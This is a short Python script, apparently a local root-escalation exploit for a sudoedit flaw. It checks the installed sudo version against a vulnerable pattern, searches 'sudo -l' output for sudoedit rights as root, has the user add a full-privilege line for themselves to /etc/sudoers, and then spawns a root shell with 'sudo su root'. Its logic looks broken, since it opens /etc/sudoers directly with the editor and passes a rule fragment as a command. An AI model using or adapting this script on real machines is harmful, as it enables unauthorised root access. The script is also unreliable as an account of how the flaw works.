import os
import subprocess

def check_sudo_version():
    cmd = "sudo --version | head -1 | grep -qE '(1\.8.*|1\.9\.[0-9]1?(p[1-3])?|1\.9\.12p1)$'"
    if subprocess.call(cmd, shell=True) != 0:
        print("> Currently installed sudo version is not vulnerable")
        exit(1)

def check_exploitability():
    cmd = "sudo -l"
    output = subprocess.check_output(cmd, shell=True)
    exploitables = []
    for line in output.splitlines():
        if "sudoedit" in line or "sudo -e" in line:
            if "(root)" in line or "(ALL)" in line or "(ALL : ALL)" in line:
                exploitables.append(line.split(")")[1])
    if not exploitables:
        print("> It doesn't seem that this user can run sudoedit as root")
        confirm = raw_input("Do you want to proceed anyway? (y/N): ")
        if not confirm.lower().startswith("y"):
            exit(2)
    else:
        print("> BINGO! User exploitable")
        return exploitables[0]

def add_to_sudoers(user):
    print("> Opening sudoers file, please add the following line to the file in order to do the privesc:")
    print("{} ALL=(ALL:ALL) ALL".format(user))
    raw_input("Press any key to continue...")
    editor = os.environ.get("EDITOR", "vim")
    subprocess.call([editor, "/etc/sudoers"])

def escalate_privileges(command):
    subprocess.call([command])
    subprocess.call(["sudo", "su", "root"])
    exit(0)

if __name__ == "__main__":
    check_sudo_version()
    exploitable = check_exploitability()
    add_to_sudoers(os.environ["USER"])
    escalate_privileges(exploitable)
